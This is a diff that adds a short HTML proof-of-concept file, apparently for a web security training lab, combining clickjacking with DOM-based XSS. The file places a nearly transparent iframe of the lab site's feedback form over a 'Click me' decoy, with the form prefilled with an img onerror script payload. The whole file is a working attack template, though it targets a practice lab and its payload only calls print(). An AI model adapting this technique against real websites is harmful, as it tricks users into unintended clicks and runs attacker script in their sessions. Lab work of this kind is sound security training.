@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<!-- DSTRIKE Lab PoC: clickjacking-lab-04.html (Clickjacking to trigger DOM-based XSS) -->
+<html>
+<head>
+  <style>
+    iframe { position: relative; width: 700px; height: 700px; opacity: 0.0001; z-index: 2; }
+    div.decoy { position: absolute; top: 610px; left: 60px; z-index: 1; }
+  </style>
+</head>
+<body>
+  <div class="decoy">Click me</div>
+  <iframe src="https://TARGET-LAB-ID.web-security-academy.net/feedback?name=%3Cimg%20src%3D1%20onerror%3Dprint()%3E&email=hacker%40attacker.net&subject=test&message=test#feedbackResult"></iframe>
+</body>
+</html>
